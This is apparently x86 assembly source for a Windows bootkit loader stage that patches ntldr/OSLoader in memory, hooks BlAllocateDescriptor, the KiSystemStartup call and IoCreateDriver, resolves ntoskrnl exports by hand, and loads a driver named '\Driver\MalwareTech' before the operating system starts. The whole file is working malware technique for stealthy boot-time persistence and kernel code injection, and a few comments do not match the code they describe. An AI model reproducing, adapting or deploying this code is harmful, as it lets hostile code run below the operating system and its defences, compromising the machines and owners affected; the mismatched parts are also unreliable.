use32
org 0x00

;=============================================================================================
;Called right after OSLoader.exe is moved to 0x401000, we remove this hook and call
;HookBlAllocateDescriptor
;=============================================================================================
Loader32Entry:
	push ebp
	mov ebp, esp
	push edi
	
	sub word [ebp+4], 0x05 ;Change return address to point to before the far call
	
	;Calculate the absolute address of our hook
	movzx edi, word [ebp+4]	;Offset
	add edi, 0x20000		;Segment always seems to be 0x20000
	
	;Remove our hook by restoring original bytes
	;We can assume the data segment base is 0x00000000, If there's any exceptions i will fix
	mov dword [edi+0], 0x0C4E8B66
	mov dword [edi+4], 0x03E18366
	
	call HookBlAllocateDescriptor
	
	pop edi
	mov esp, ebp
	pop ebp
	retfw	;16-bit Far return back to ntldr
	

;=============================================================================================
;Scan for a call to BlAllocateDescriptor, calcualte the absolute address of the function
;from the relative address in the call then overwrite first 5 bytes with a jump to our code
;We scan for the following bytes to find the call to BlAllocateDescriptor: 
;08 51 6A 01 52 50 6A 05 E8
;push ecx
;push 0x01
;push edx
;push eax
;push 0x05
;call
;=============================================================================================	
HookBlAllocateDescriptor:
	push ecx
	push edx
	push eax
	
	push 0x30000 	;Scan first 0x30000 bytes of OSLoader
	push 0x401000	;OSLoader base address is always 0x401000
	push 0xE8056A50	;Signature Bytes 6 - 9
	push 0x52016A51	;Signature Bytes 2 - 5
	push 0x08		;First byte of signature
	call Scan9ByteSignature	;Look for the byte signature
	
	test eax, eax
	je HookBlAllocateDescriptorEnd
	
	;Calculate absolute address of BlAllocateDescriptor
	lea eax, [eax+0x09]		  ;2nd byte of the call (relative address)
	mov ecx, dword [eax] 	  ;Extract relative address of BlAllocateDescriptor from call
	add ecx, eax 			  ;Add it to absolute address of call instruction
	add ecx, 0x04  		 	  ;Absolute address = (Offset + Current Address + Address Size)
	
	mov [0x80400+BlAllocateDescriptor], ecx ;Store the address so we can call it later
	
	mov edx, 0x80400 						;Our base address
	add edx, (BlAllocateDescriptorProxy-5)  ;destination adress - length of jump
	sub edx, ecx							;Subtract source address
	
	;Store original bytes
	mov ebx, [ecx]
	mov dword [0x80400+BlAllocateDescByte], ebx
	mov bl, [ecx+4]
	mov byte [0x80400+BlAllocateDescByte+4], bl
	
	mov byte [ecx], 0xE9	;relative jump
	mov dword [ecx+1], edx	;Offset

HookBlAllocateDescriptorEnd:	
	pop eax
	pop edx
	pop ecx
	ret
	
	
;=============================================================================================
;Unhook BlAllocateDescriptor then call it to allocate some memory for our bootloader & driver
;call HookKiSystemStartup then complete the original BlAllocateDescriptor call so OSLoader 
;can continue
;=============================================================================================		
BlAllocateDescriptorProxy:
	pushad
	pushfd
	push es
	
	;Restore hooked bytes
	mov ecx, [0x80400+BlAllocateDescriptor]	
	mov ebx, dword [0x80400+BlAllocateDescByte]
	mov [ecx], ebx
	mov bl, byte [0x80400+BlAllocateDescByte+4]
	mov [ecx+4], bl

	
	mov eax, [0x80400+NewLoader32AddressPtr] ;BlAllocateDescriptor will store page number here
	push eax
	push 0x01								 ;Alignment (4096 byte aligned)
	push 0x01 								 ;1 Page (4096 bytes)
	push 0x00								 ;Base page (None - Allocate anywhere)
	push 0x09								 ;Memory type (SystemCode)
	call [0x80400+BlAllocateDescriptor]		 ;Allocate
	
	test eax, eax
	jne BlAllocateDescriptorProxyEnd
	
	push ds
	pop es
	
	call LoadDriver
	
	;Convert page number to absolute address
	mov eax, [0x80400+NewLoader32Address]	;Starting page number of our allocated memory
	shl eax, 0x0C 							;Multiply by page size
	or eax, 0x80000000						;Or with kernel base
	
	mov [0x80400+GetLoaderBase+1], eax 		;Setup the GetLoaderBase function
	
	mov edi, eax							;Copy to new buffer
	mov esi, 0x80400						;Only copy loader32
	mov ecx, 0x400							;Copy 0x400 words (2048 byte)
	rep movsw
	
	call HookKiSystemStartup
	
BlAllocateDescriptorProxyEnd:
	pop es
	popfd
	popad
	
	jmp [0x80400+BlAllocateDescriptor] ;Process original call
	
	
;=============================================================================================
;Load the driver file into allocated memory and process relocations, resolving of imports is
;done later because ntoskrnl isn't loaded into memory yet
;=============================================================================================		
LoadDriver:
	push ebp
	mov ebp, esp
	
	sub esp, 0x14				;Allocate space for 5 stack variables
	
	mov eax, 0x81000			;Driver PE file memory location

	mov ecx, [eax+0x3C]			;IMAGE_DOS_HEADER.e_lfanew
	add ecx, eax				;IMAGE_NT_HEADERS

	cmp dword [ecx], 0x4550 	;IMAGE_NT_HEADERS.Signature
	jne LoadDriverFailed

	mov [ebp-0x04], ecx 		;Store IMAGE_NT_HEADERS
	lea edx, [ecx+0x04]			;IMAGE_FILE_HEADER
	mov [ebp-0x08], edx			;Store IMAGE_FILE_HEADER
	
	lea edx, [ecx+0x18]			;IMAGE_OPTIONAL_HEADER
	mov [ebp-0x0C], edx 		;Store IMAGE_OPTIONAL_HEADER
	
	lea edi, [0x80400+DriverEntryPoint]
	mov esi, [edx+0x10]			;IMAGE_OPTIONAL_HEADER.AddressOFEntryPoint
	mov [edi], esi
	
	movzx eax, word [ecx+0x14]	;IMAGE_FILE_HEADER.SizeOfOptionalHeader
	lea eax, [eax+edx]			;IMAGE_SECTION_HEADER
	mov [ebp-0x10], eax			;Store IMAGE_SECTION_HEADER
	
	mov edx, [edx+0x38]			;IMAGE_OPTIONAL_HEADER.SizeOfImage
	
	push edx					;Size of driver in bytes
	call AllocateDriverMemory	;Allocate some pages for driver
	
	test eax, eax
	jne LoadDriverFailed
	
	mov ecx, [ebp-0x0C]			;IMAGE_OPTIONAL_HEADER
	mov ecx, [ecx+0x3C] 		;IMAGE_OPTIONAL_HEADER.SizeOfHeaders
	shr ecx, 0x02				;Divide header size by 4 (we are copying dwords not bytes)
	
	mov edi, [0x80400+DriverBaseAddress]
	mov esi, 0x81000
	
	push esi
	push edi
	
	rep movsw					;Copy image headers to allocated memory (1 dword at a time)

	pop edi
	pop esi
	
	mov edx, [ebp-0x08] 		;IMAGE_FILE_HEADER
	movzx edx, word [edx+0x02]	;IMAGE_FILE_HEADER.NumberOfSections
	mov eax, [ebp-0x10]			;IMAGE_SECTION_HEADER (First section)
	xor ebx, ebx
	
CopyNextSection:
	push esi
	push edi
	
	cmp edx, ebx				;Is last section?
	je	CopySectionDone
	
	mov ecx, [eax+0x0C]			;IMAGE_SECTION_HEADER.VirtualAddress
	add edi, ecx
	
	mov ecx, [eax+0x14]			;IMAGE_SECTION_HEADER.PointerToRawData				
	add esi, ecx
	
	mov ecx, [eax+0x10]			;IMAGE_SECTION_HEADER.SizeOfRawData
	rep movsb					;Copy section data into image memory
	
	add eax, 0x28				;sizeof IMAGE_SECTION_HEADER (next section)
	
	pop edi
	pop esi
	
	inc ebx						;One less section to copy
	
	jmp CopyNextSection
	
CopySectionDone:
	pop edi
	pop esi
	mov eax, [0x80400+DriverBaseAddress]
	mov ecx, [ebp-0x0C]
	sub eax, [ecx+0x1C]			;IMAGE_OPTIONAL_HEADER.ImageBase
	
	push eax					;Reloaction offset
	push ecx					;IMAGE_OPTIONAL_HEADER
	call FixRelocationTable		
	
	mov ecx, [ebp-0x0C]
	
LoadDriverFailed:
	mov esp, ebp
	pop ebp
	ret

	
;=============================================================================================
;Calculate number of pages required for the driver ((SizeOfImage / 4096) + 1) then allocate
;them using BlAllocateDescriptor
;Parameters:
;1) Size of memory required in bytes (will be rounded up a page)
;=============================================================================================
AllocateDriverMemory:
	push ebp
	mov ebp, esp
	
	mov edx, [ebp+0x08]						
	shr edx, 0x0A							;divide by 4096 (page size)
	add edx, 1								;Round up to nearest page
	
	mov eax, [0x80400+DriverBaseAddressPtr] ;Starting page number will be stored here
	push eax
	push 0x01								;Alignment (4096 byte aligned)
	push edx 								;edx pages (edx * 4096 byte)
	push 0x00								;Base page (None - Allocate anywhere)
	push 0x09								;Memory type (SystemCode)
	call [0x80400+BlAllocateDescriptor]		;Allocate
	
	test eax, eax
	jnz AllocateDriverFailed
	
	mov edx, [0x80400+DriverBaseAddress]	;Holds starting page number of allocated mem
	shl edx, 0x0C 							;Multiply by page size
	or edx, 0x80000000						;Or with kernel base
	mov [0x80400+DriverBaseAddress], edx	;Store absolute address
	
AllocateDriverFailed:
	mov esp, ebp
	pop ebp
	ret 0x04


;=============================================================================================
;Iterate the entries in the reloc table and fix up each address
;Parameters:
;1) IMAGE_OPTIONAL_HEADER address
;2) Fixup offset (BaseAddress - IMAGE_OPTIONAL_HEADER.ImageBase)
;=============================================================================================	
FixRelocationTable:
	push ebp
	mov ebp, esp
	
	sub esp, 0x0C				;Space for 3 stack variables 
	
	mov ecx, [ebp+0x08]			;IMAGE_OPTIONAL_HEADER
	lea edx, [ecx+0x88]			;IMAGE_DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_BASERELOC]

	mov ebx, [edx+0x04]			;IMAGE_DATA_DIRECTORY[x].Size
	mov [ebp-0x04], ebx			;Store size
	
	mov edx, [edx]				;IMAGE_DATA_DIRECTORY[x].VirtualAddress
	
	test edx, edx				;Check if relocation table exits				
	jz FixRelocDone
	
	add edx, [0x80400+DriverBaseAddress]
	xor eax, eax
	
FixBlocLoop:
	cmp eax, [ebp-0x04]
	jge FixRelocDone
	
	push eax
	
	mov ebx, [edx]				;IMAGE_BASE_RELOCATION.VirtualAddress
	add ebx, [0x80400+DriverBaseAddress]
	mov ecx, [edx+0x04]			;IMAGE_BASE_RELOCATION.SizeOfBlock
	mov [ebp-0x0C], ecx			;Store SizeOfBlock
	
	lea eax, [ecx-0x08]			;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)
	shr eax, 0x01				;Divide by 2 (eax is number of entries in block)
	
	lea ecx, [edx+0x08]			;Offset to first entry
	
	push dword [ebp+0x0C]		;Fixup address
	push eax					;Number of entries
	push ecx					;First relocation entry
	push ebx					;Relocation block
	call RelocateAddress
	
	pop eax
	add eax, [ebp-0x0C]
	add edx, [ebp-0x0C]
	jmp FixBlocLoop
	
FixRelocDone:
	mov esp, ebp
	pop ebp
	ret 0x08


;=============================================================================================
;Go through each address in the current relocation block and fix them to work with image base
;Parameters:
;1) Relocation block
;2) Number of entries in block
;3) Offset to first entry
;4) Fixup offset (BaseAddress - IMAGE_OPTIONAL_HEADER.ImageBase)
;=============================================================================================
RelocateAddress:
	push ebp
	mov ebp, esp
	pushad
	
	mov eax, [ebp+0x10]			;Number of addresses
	xor ecx, ecx
	
RelocAddressLoop:
	cmp ecx, eax
	jz RelocAddressDone
	
	mov ebx, [ebp+0x0C]			;Current offset
	movzx ebx, word [ebx]		;Reloc entry
	mov edx, ebx
	
	shr ebx, 0x0C				;Relocation type
	and ebx, 0x03				;IMAGE_REL_BASED_HIGHLOW
	
	test ebx, ebx
	jz	RelocAddressSkipEntry	;Not valid reloc type
	
	and edx, 0xFFF				;Relocation Offset
	mov edi, [ebp+0x08]			;IMAGE_BASE_RELOCATION.VirtualAddress
	lea edi, [edi+edx]			;Virtual address of address to be fixed
	
	mov esi, [edi] 				;Address to be fixed
	add esi, [ebp+0x14]			;New offset
	mov [edi], esi				;Save fixed address
	
RelocAddressSkipEntry:
	inc ecx
	add dword [ebp+0x0C], 0x02
	jmp RelocAddressLoop

RelocAddressDone:	
	popad
	mov esp, ebp
	pop ebp
	ret 0x10


;=============================================================================================
;We place a hook in OSLoader right before execution is transfered to ntoskrnl entry point
;We scan for the following bytes: 8B F0 85 F6 74 11 68 4C 23
;mov esi, eax
;test esi, esi
;jz 0x11
;push 234Ch
;(Just before the call to ntoskrnl, call [ebp+0x??])
;we will place the hook right before mov esi, eax (on the instruction call ????), before
;the call a parameter is pushed, this parameter is the kernel LOADER_PARAMETER_BLOCK which is
;also passed to KiSystemStartup, we can use this to get the ntoskrnl base address
;=============================================================================================	
HookKiSystemStartup:
	push eax
	
	push 0x30000		;Scan first 0x30000 bytes of OSLoader	
	push 0x401000		;OSLoader base address is always 0x401000
	push 0x234C6811		;Signature Bytes 6 - 9
	push 0x74F685F0  	;Signature Bytes 2 - 5
	push 0x8B			;First byte of signature
	call Scan9ByteSignature
	
	test eax, eax
	je HookKiSystemStartupEnd

	lea edx, [eax-5]					;the call instruction before mov esi, eax
	
	call GetLoaderBase					
	mov [eax+KiSystemStartup], edx		;Address of where we will place the hook
	mov ebx, [edx+1]
	mov [eax+KiSystemStartupOffset], ebx;Store the last 4 bytes of call (offset)
	
	lea eax, [eax+KiSystemStartupProxy] ;Address of KiSystemStartupProxy in new loader
	sub eax, edx						;Calculate relative address of KiSystemStartupProxy 
	sub eax, 0x05						;Offset starts from end of 5 byte jump
	
	mov dword [edx+1], eax				;Overwite last 4 bytes of call with offset to our code
	
HookKiSystemStartupEnd:
	pop eax
	ret

	
;=============================================================================================
;Scan for a 9 byte signature 
;Parameters:
;1) Signature Byte 1
;2) Signature Bytes 2 - 5
;3) Signature Bytes 6 - 9
;4) Address to start scan at
;5) Number of bytes to scan
;=============================================================================================
Scan9ByteSignature:
	push ebp
	mov ebp, esp
	
	push edx
	push ecx
	push edi
	push es
	
	push ds
	pop es
	
	cld
	
	mov edi, [ebp+0x14]			;OSLoader base address
	mov ecx, [ebp+0x18]			;Signature should be in first 30k bytes of OSLoader
	
ContinueScan:	
	mov eax, [ebp+0x08]			;First byte of signature
	repne scasb
	jne NotFound
	
	mov edx, [ebp+0x0C]
	cmp dword [es:edi+0], edx 	;Next 4 bytes of signature
	jne ContinueScan
	
	mov edx, [ebp+0x10]
	cmp dword [es:edi+4], edx 	;Next 4 bytes of signature
	jne ContinueScan
	
	lea eax, [edi-0x01] 		;Address of signature start
	jmp ScanDone
	
NotFound:
	xor eax, eax
	
ScanDone:
	pop es
	pop edi
	pop ecx
	pop edx
	
	mov esp, ebp
	pop ebp
	ret 0x14
	
	
;=============================================================================================
;After here, the rest of loader32 is executining in dynamically allocated memory, the below
;function will be set to the base address of the allocated memory to make things easier
;=============================================================================================
GetLoaderBase:
	mov eax, 0xDEADBEEF
	ret


;=============================================================================================
;Hook IoCreateDriver, unhook KiSystemStartup then pass control back to the original 
;KiSystemStartup code
;=============================================================================================	
KiSystemStartupProxy:
	push ebp
	mov ebp, esp
	pushad
	pushfd
	
	sub dword [ebp+0x04], 0x05	;Fix the return address to point to before call instruction
	
	call GetLoaderBase
	
	;Get ntoskrnl base address
	mov edx, [ebp+0x08] 		;kernel LOADER_PAREMTER_BLOCK 
	mov edx, [edx]				;LOADER_PAREMTER_BLOCK.LoadOrderListHead (LDR_DATA_TABLE_ENTRY)
	mov edx, [edx+0x18]			;LDR_DATA_TABLE_ENTRY.BaseAddress (ntoskrnl base)
	mov [eax+NtoskrnlBaseAddress], edx
	
	;Restore hooked bytes
	mov edx, [eax+KiSystemStartup]
	mov ebx, [eax+KiSystemStartupOffset]	
	mov dword [edx+1], ebx		;Restore original call offset
	
	call HookIoCreateDriver
	
	popfd
	popad
	mov esp, ebp
	pop ebp
	ret							

	
;=============================================================================================
;Iterate the import address table and resolve each import, we only resolve imports from  
;ntoskrnl which shouldnt be a problem as there's no need to use any non-ntosknrl imports
;=============================================================================================
ResolveDriverImports:
	push ebp
	mov ebp, esp
	
	sub esp, 0x04				;Space for 1 stack variable
	
	call GetLoaderBase
	mov eax, [eax+DriverBaseAddress]
	mov [ebp-0x04], eax			;Store driver base address
	
	mov ecx, [eax+0x3C]			;IMAGE_DOS_HEADER.e_lfanew
	add ecx, eax				;IMAGE_NT_HEADERS

	cmp dword [ecx], 0x4550 	;IMAGE_NT_HEADERS.Signature
	jne ProcessImportsError
	
	lea ecx, [ecx+0x18]			;IMAGE_OPTIONAL_HEADER
	lea edx, [ecx+0x68]			;IMAGE_DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_IMPORT]
	
	mov edx, [edx]				;IMAGE_DATA_DIRECTORY[x].VirtualAddress
	
	test edx, edx				;Check if import table table exits				
	jz FixRelocDone
	
	mov esi, [ebp-0x04]
	
	add edx, esi
	
	mov ebx, [edx+0x10]			;IMAGE_IMPORT_DESCRIPTOR.FirstThunk
	add ebx, esi
	
	mov eax, [edx]				;IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk
	add eax, esi
	
ProcessImportsLoop:	
	mov edi, [eax]
	test edi, edi
	jz ProcessImportsDone
	
	lea edi, [esi+edi+0x02]		;IMAGE_IMPORT_BY_NAME.Name
	
	push eax

	call GetLoaderBase
	mov eax, [eax+NtoskrnlBaseAddress]
	
	push edi
	push eax
	call GetProcAddress			;Resolve in ntoskrnl
	mov ecx, eax

	pop eax
	
	test ecx, ecx				;Store imported address back into IAT
	jz ProcessImportsError
	
	mov [ebx], ecx 

	add eax, 4					;Next name
	add ebx, 4					;Next function pointer
	jmp ProcessImportsLoop
	
ProcessImportsError:
	mov eax, 0
	
ProcessImportsDone:	
	mov esp, ebp
	pop ebp
	ret 

	
;=============================================================================================
;Resolves a given import name in ntoskrnl
;Parameters
;1) Module Base
;2) Function name
;=============================================================================================	
GetProcAddress:
	push ebp
	mov ebp, esp
	
	sub esp, 0x0C				;Allocate space for 3 stack variables
	
	push ecx
	push edx
	push ebx
	
	mov eax, [ebp+0x08]			;Base address of ntoskrnl

	mov ecx, [eax+0x3C]			;IMAGE_DOS_HEADER.e_lfanew
	add ecx, eax				;IMAGE_NT_HEADERS

	cmp dword [ecx], 0x4550 	;IMAGE_NT_HEADERS.Signature
	jne GPAFailed

	lea edx, dword [ecx+0x78]	;IMAGE_NT_HEADERS.OptionalHeader.DataDirectory
	mov edx, dword [edx]		;IMAGE_DATA_DIRECTORY.VirtualAddress
	add edx, eax				;Calculate absolute address (Base+VirtualAddress)

	mov ecx, dword [edx+0x1C]	;IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
	add ecx, eax				;Calculate absolute address (Base+AddressOfFunctions)
	mov [ebp-0x04], ecx			;Store AddressOfFunctions on stack

	mov ecx, dword [edx+0x20]	;IMAGE_EXPORT_DIRECTORY.AddressOfNames
	add ecx, eax				;Calculate absolute address (Base+AddressOfNames)
	mov [ebp-0x08], ecx			;Store AddressOfNames on stack

	mov ecx, dword [edx+0x24]	;IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
	add ecx, eax				;Calculate absolute address (Base+AddressOfNameOrdinals)
	mov [ebp-0x0C], ecx			;Store AddressOfNameOrdinals on stack

	xor ecx, ecx				;FunctionNumber

NextExport:
	mov ebx, [ebp-0x08]			;AddressOfNames
	mov ebx, [4*ecx+ebx]		;AddressOfNames[FunctionNumber]
	add ebx, eax				;Absolute address of function name

	push eax

	push ebx					;FunctionName
	push dword [ebp+0x0C]		;Name of export we're looking for
	call strcmp					;Compare
	test eax, eax

	pop eax					
	je GPASuccess				;These are the offsets we're looking for

	inc ecx						;FunctionNumber++
	cmp ecx, [edx+0x18]			;IMAGE_EXPORT_DIRECTORY.NumberOfNames (Is this the last func?)
	jne NextExport				;Nope.avi
	jmp GPAFailed				;We reached the last function and never found the one we want

GPASuccess:
	mov edx, [ebp-0x0C]			;AddressOfNameOrdinals
	movzx ebx, word [2*ecx+edx]	;Ordinal[FunctionNumber]
	mov ecx, [ebp-0x04]			;AddressOfFunctions
	mov ebx, dword [4*ebx+ecx]	;AddressOfFunctions[Ordinal[FunctionNumber]]
	add eax, ebx				;Absolute address of function
	
	jmp GPAFinished				

GPAFailed:
	xor eax, eax
	
GPAFinished:
	pop ebx
	pop edx
	pop ecx
	
	mov esp, ebp
	pop ebp
	ret 0x08

	
;=============================================================================================
;Case insensitve ASCII string comparison
;Parameters
;1) String 1
;2) String 2
;=============================================================================================
strcmp:
	push ebp
	mov ebp, esp
	
	push esi
	push edi
	push ecx
	
	mov esi, [ebp+0x08]	;String1
	mov edi, [ebp+0x0C]	;String2
	xor ecx, ecx

StrcmpLoop:
	mov al, byte [edi+ecx]
	mov ah, byte [esi+ecx]
	and al,0xDF			;Case insensitive
	and ah,0xDF
	cmp al, ah
	jne StrcmpNotEqual

	cmp al, 0
	je StrcmpIsEqual

	inc ecx
	jmp StrcmpLoop

StrcmpIsEqual:
	xor eax, eax
	jmp StrcmpEnd

StrcmpNotEqual:
	mov eax, 1
	
StrcmpEnd:
	pop ecx
	pop edi
	pop esi
	
	mov esp, ebp
	pop ebp
	ret 0x08


;=============================================================================================
;Place a hook right at the start of IoCreateDriver which will be called during IoInitSystem we
;will hijack the call and use it to call our own driver then process the original call
;=============================================================================================
HookIoCreateDriver:
	push ebp
	mov ebp, esp
	
	call GetLoaderBase
	mov edx, [eax+NtoskrnlBaseAddress]
	lea eax, [eax+IoCreateDriverName]
	
	push eax
	push edx								
	call GetProcAddress						;Resolve IoCreateDriver
	mov edx, eax
	
	test edx, edx
	jz HookIoCreateDriverEnd
	
	call GetLoaderBase
	
	mov ecx, eax 							;Our base address
	add ecx, (IoCreateDriverProxy-5)  		;destination adress - length of jump
	sub ecx, edx							;Subtract source address
	
	lea edi, [eax+IoCreateDriverBytes] 		;We will store 5 bytes of IoCreateDriver
	mov ebx, [edx]							;Get first dword
	mov [edi], ebx							;Store first dword
	mov bl, byte [edx+4]					;get last byte
	mov [edi+4], bl							;Store last byte
	
	mov [eax+IoCreateDriver], edx			;Store address of IoCreateDriver
	
	mov byte [edx], 0xE8					;relative call
	mov dword [edx+1], ecx					;Offset
	
HookIoCreateDriverEnd:	
	mov esp, ebp
	pop ebp
	ret


;=============================================================================================
;Unhook IoCreateDriver, resolve our driver imports, then use CallDriver to call entry point
;once we're done we can return to before where the hook was in order to process original call 
;=============================================================================================
IoCreateDriverProxy:
	push ebp
	mov ebp, esp
	pushad
	pushfd
	
	sub dword [ebp+0x04], 0x05				;Fix the return address to point to before call 
	
	call ResolveDriverImports				;Resolve our driver imports now ntoskrnl is loaded
	
	call GetLoaderBase

	mov edi, [eax+IoCreateDriver]
	lea esi, [eax+IoCreateDriverBytes]		
	
	;We restore hook so we dont infinite loop
	mov ebx, [esi]							;Load first dword
	mov [edi], ebx							;Restore first 2 bytes
	mov bl, [esi+4]							;Load  last byte
	mov [edi+4], bl							;Restore last byte
	
	call CallDriver							;Call our driver
	
	popfd
	popad
	mov esp, ebp
	pop ebp
	ret
	
;=============================================================================================
;Resolve driver imports and call the driver entry point via IoCallDriver
;=============================================================================================
CallDriver:	
	push ebp
	mov ebp, esp
	
	call GetLoaderBase

	lea edx, [eax+DriverNameBuffer]		;Address of UNICODE_STRING.Buffer
	lea ecx, [eax+DriverName]			;Address of DriverName
	mov [edx], ecx						;Point UNICODE_STRING.Buffer to DriverName
	
	lea ebx, [eax+DriverNameUnicodeString]
	
	;Calculate driver entry point
	mov ecx, [eax+DriverEntryPoint]
	mov edi, [eax+DriverBaseAddress]
	add ecx, edi
	
	mov eax, [eax+IoCreateDriver]
	
	push ecx	;Driver entry point
	push ebx	;DriverName (UNICODE_STRING)
	call eax	;IoCreateDriver
	
CallDriverEnd:	
	mov esp, ebp
	pop ebp
	ret


;================================================================================================
;Data Area
;================================================================================================
NewLoader32AddressPtr	dd (0x80400+NewLoader32Address)
DriverBaseAddressPtr	dd (0x80400+DriverBaseAddress)
NewLoader32Address		dd 0x00	;We will allocate some memory and move Loader32 there	
DriverBaseAddress		dd 0x00	;We will allocate some memory for driver to run from
DriverEntryPoint		dd 0x00	;Entry point of the driver to be called by CallDriver
NtoskrnlBaseAddress		dd 0x00	;We will need this to resolve our driver imports
BlAllocateDescriptor 	dd 0x00 ;Address of BlAllocateDescriptor
KiSystemStartup 		dd 0x00 ;Address of bytes just before KiSystemStartup is called
KiSystemStartupOffset	dd 0x00	;The offset in the call we overwrite	
BlAllocateDescByte		db 0x00,0x00,0x00,0x00,0x00	;Store the 5 bytes overwritten by jump

IoCreateDriverBytes 	db 0x00,0x00,0x00,0x00,0x00 ;Store first 5 bytes of IoCreateDriver here
IoCreateDriverName		db 'IoCreateDriver', 0		;Name for GetProcAddress
IoCreateDriver			dd 0x00						;Address of IoCreateDriver
DriverName				du '\Driver\MalwareTech'	;Name of our driver (unicode)

DriverNameUnicodeString dw	0x26					;Must be length of DriverName
DriverNameMaxSize		dw 	0x28					;Length including null-terminator
DriverNameBuffer		dd  0x00


